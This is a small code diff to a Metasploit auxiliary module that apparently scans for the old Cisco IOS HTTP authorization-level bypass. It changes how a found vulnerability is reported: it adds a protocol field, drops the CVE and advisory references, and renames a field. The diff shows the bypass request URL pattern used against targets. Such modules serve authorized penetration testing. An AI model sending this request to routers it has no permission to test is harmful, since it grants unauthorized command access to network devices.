@@ -62,15 +62,9 @@ class Metasploit3 < Msf::Auxiliary
 				report_vuln(
 					:host	=> rhost,
 					:port	=> rport,
+					:proto  => 'tcp',
 					:name	=> 'IOS-HTTP-AUTH-BYPASS',
-					:info	=> "http://#{rhost}:#{rport}/level/#{level}/exec/show/version/CR",
-					:refs   =>
-					[
-						[ 'BID', '2936'],
-						[ 'CVE', '2001-0537'],
-						[ 'URL', 'http://www.cisco.com/warp/public/707/cisco-sa-20010627-ios-http-level.shtml'],
-						[ 'OSVDB', '578' ],
-					]
+					:data	=> "http://#{rhost}:#{rport}/level/#{level}/exec/show/version/CR",
 				)
 				
 				res = send_request_cgi({
